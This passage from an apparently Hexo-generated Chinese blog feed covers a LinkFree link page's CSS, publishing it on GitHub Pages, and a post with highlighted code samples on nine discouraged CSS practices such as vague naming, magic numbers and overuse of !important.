class="line">  <span class="attribute">background-color</span>: <span class="number">#0a072e</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#userPhoto</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">96px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">96px</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">35px</span> auto <span class="number">20px</span>;</span><br><span class="line">  -webkit-<span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">6px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">222</span>, <span class="number">218</span>, <span class="number">162</span>, <span class="number">1</span>);</span><br><span class="line">  -moz-<span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">6px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">222</span>, <span class="number">218</span>, <span class="number">162</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">6px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">222</span>, <span class="number">218</span>, <span class="number">162</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.15s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#userPhoto</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">8px</span> <span class="built_in">rgba</span>(<span class="number">222</span>, <span class="number">218</span>, <span class="number">162</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">2px</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#userPhoto</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">0px</span> black;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">6px</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#userName</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">600</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.25</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="built_in">var</span>(--font);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#links</span> &#123;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">675px</span>;</span><br><span class="line">  <span class="attribute">width</span>: auto;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">27px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">700px</span>) &#123;</span><br><span class="line">  <span class="selector-id">#links</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">3%</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">3%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.night_mode</span> &#123;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">40%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.link</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#01a79b</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="built_in">var</span>(--font);</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">17px</span>;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.15s</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">6px</span> <span class="number">#007569</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.link</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="comment">/* background: #019489; */</span></span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">8px</span> <span class="number">#007569</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">2px</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.link</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">6px</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">#007569</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#proker</span> &#123;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">width</span>: auto;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">27px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1.3rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.footer</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.media</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#dd5a79</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">38px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">38px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">6px</span> <span class="number">#9e4355</span>;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.15s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.media</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">8px</span> <span class="number">#9e4355</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">2px</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.media</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">6px</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">#9e4355</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LinkFree-Github-Pages"><a href="#LinkFree-Github-Pages" class="headerlink" title="LinkFree Github Pages"></a>LinkFree Github Pages</h2><p><a href="https://pages.github.com/">Github Page</a> 是由 Github 免費提供展示靜態頁面的服務。</p><p>使用上就是五個步驟</p><ol><li>建立 Repo</li><li>將要顯示的靜態頁面 Push 到 Repo</li><li>可以在 repo 的頁面按 <code>.</code> 進入網頁編輯模式或是將連結修改成 github.dev 開頭 &#x3D;&gt; <a href="https://github.dev/LinYenCheng/LinkFree">https://github.dev/LinYenCheng/LinkFree</a></li><li>專案設定中的 Page 指定 branch 以及資料夾</li><li>等待發佈和驗證</li></ol><p>詳細圖說可以參考<a href="https://www.facebook.com/linyencheng.3mins/posts/pfbid07C6gSnyEsdiZjLSbgrJXKUYmCyo8ERokHynSHzWXDBXg3fjaizpDSUjspciwN7Qcl">粉絲專頁貼文</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>九種亂寫 CSS 的方法 X 有比亂化妝好嗎</title>
      <link href="/2022/09/11/relationships-between-frontend-and-backend/css-bad-practices/"/>
      <url>/2022/09/11/relationships-between-frontend-and-backend/css-bad-practices/</url>
      
        <content type="html"><![CDATA[<p>亂寫 CSS 有比亂化妝好嗎?</p><p>如果說 CSS 是主掌網頁外表的一個角色，亂寫 CSS 就相當於亂化妝的概念。</p><p>CSS 在撰寫上，整體來說是圍繞在處理特異性 <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity">Specificity</a>。</p><p>小編接下來在這篇文章會開箱 9 種不是特別推薦的 CSS 寫法。</p><h2 id="CSS-命名問題"><a href="#CSS-命名問題" class="headerlink" title="CSS 命名問題"></a>CSS 命名問題</h2><p>首先是來探討萬年難解的命名問題，跟午餐、晚餐吃什麼是同等困難的事情?</p><p>CSS in JS 某些程度上就是為了解決這個問題而存在的。</p><p>不過時間管理大師的命名大概是會把 line 的聯絡人寫到大家都看不出來是誰。</p><h3 id="命名太通用"><a href="#命名太通用" class="headerlink" title="命名太通用"></a>命名太通用</h3><p><code>.userPhoto</code> 這個樣式檔在購物網站究竟是買家、賣家、系統管理者，都幾?!</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.userPhoto</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">94px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">87px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解決方式，也許是用組合的方式 <code>&lt;img class=&quot;photo buyer__photo&quot; /&gt;</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.photo</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.buyer__photo</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.seller__photo</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.admin__photo</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="樣式重複"><a href="#樣式重複" class="headerlink" title="樣式重複"></a>樣式重複</h3><p>因為命名沒有規範，導致同樣的樣式可能被不同的工程師重複撰寫。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#878787</span>;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">94.87px</span>;</span><br><span class="line">  <span class="attribute">border</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.card</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#878787</span>;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">94.87px</span>;</span><br><span class="line">  <span class="attribute">border</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 SCSS 可以用 <code>@extend</code> 但產生出來的還是重複的 &gt;.^</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#878787</span>;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">94.87px</span>;</span><br><span class="line">  <span class="attribute">border</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.card</span> &#123;</span><br><span class="line">  <span class="keyword">@extend</span> .container;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命名可以規範團隊使用原子化樣式來增加重用性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.bg-87</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#878787</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.bordor-none</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.max-width-9487</span> &#123;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">94.87px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="樣式之間的關係不明確"><a href="#樣式之間的關係不明確" class="headerlink" title="樣式之間的關係不明確"></a>樣式之間的關係不明確</h3><p>正常撰寫會像下面，其實單看樣式檔或是單看 HTML 蠻難知道相互關係。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sheets&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>透過 BEM 可以看得出來 title 會被 sheets 影響 item 會被 list 影響。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sheets&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;sheets__title&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list__item list__item--active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list__item&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="SCSS-巢狀-BEM-縮寫難搜尋"><a href="#SCSS-巢狀-BEM-縮寫難搜尋" class="headerlink" title="SCSS 巢狀 BEM 縮寫難搜尋"></a>SCSS 巢狀 BEM 縮寫難搜尋</h3><p>SCSS + BEM 雖然打的字變少不好搜尋，好處是改名字比較快，但搜尋的時候要找到 <code>list__item--active</code> 需要多一個步驟。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line"></span><br><span class="line">  &amp;__item &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">25%</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &amp;__item<span class="attr">--active</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小編個人偏好這樣比較好搜尋 0.0</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.list__item</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">25%</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.list__item--active</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="屬性設定"><a href="#屬性設定" class="headerlink" title="屬性設定"></a>屬性設定</h2><p>屬性在設定上如果有使用變數，大家最後都會感謝你。</p><h3 id="屬性重複"><a href="#屬性重複" class="headerlink" title="屬性重複"></a>屬性重複</h3><p>有好幾個地方都需要將字體顯示為 <code>#878787</code>，比較不好的撰寫方式就是在每個地方都加上 <code>color: #878787;</code>。</p><p>如果突然需要更換顏色會需要動到很多地方，全部取代可能會出現預期外的錯誤。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#intro</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#878787</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#878787</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#banner</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#878787</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">30px</span>;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">images/banner.jpg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更好的作法是將 <code>#878787</code> 設成變數，或是寫成一個獨立的 class <code>.text-color</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--color-text</span>: <span class="number">#878787</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.text-color</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#878787</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="魔法數字"><a href="#魔法數字" class="headerlink" title="魔法數字"></a>魔法數字</h3><p>不解釋，但小編有時候被趕鴨子上架也是會寫 XDDD</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.divBug</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">94.87px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.zIndexBug</span> &#123;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">99999</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Specificity"><a href="#Specificity" class="headerlink" title="Specificity"></a>Specificity</h2><p>CSS 最重要的就是在處理這個問題。</p><h3 id="important"><a href="#important" class="headerlink" title="!important"></a>!important</h3><p>有些時候你會想蓋掉前一個卻怎麼樣也蓋不掉這時候就會使用 <code>!important</code>，但如果大家都這樣用，就會變成兩個人掉到水裡請問你要救哪個的問題。</p><p><code>!important</code> 的適用情境會適用在寫 Utility 的 CSS，將常用的樣式獨立並確保樣式能覆蓋上去。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">header</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span><span class="selector-class">.intro</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#878787</span> <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多餘的選擇器"><a href="#多餘的選擇器" class="headerlink" title="多餘的選擇器"></a>多餘的選擇器</h3><p>每個 class 本來就一定會接著某個 element 所以 <code>h1.big</code> 中的 <code>h1</code> 就是多餘的，只是練習打字並不會有太多的加分效果。</p><p>As It</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span><span class="selector-class">.big</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.nav</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.button</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.header</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Should Be</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.big</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.nav</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.button</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="目標設太廣或太窄"><a href="#目標設太廣或太窄" class="headerlink" title="目標設太廣或太窄"></a>目標設太廣或太窄</h3><p>在撰寫樣式檔以能夠重用的前提下，應該盡量減少使用 ID 選擇器和標籤選擇器。</p><p>若是想要直接全域改 HTML element，那最多就是使用 <a href="https://meyerweb.com/eric/tools/css/reset/">Reset css</a> 或是其他套用框架幫你正規化。</p><p>底下這種影響範圍太大都是不建議的:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">section</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">figure</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">1em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">1em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ID 則是範圍太小，但若是明確的知道就是只有這個，那也請斟酌的使用，舉例來說 React 的 root element 就蠻適合給 ID 的。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#onlyOne</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS in JS (react) 簡介與優缺點分析</title>
      <link href="/2022/09/10/relationships-between-frontend-and-backend/css-in-js-with-reactjs/"/>
      <url>/2022/09/10/relationships-between-frontend-and-backend/css-in-js-with-reactjs/</url>
      
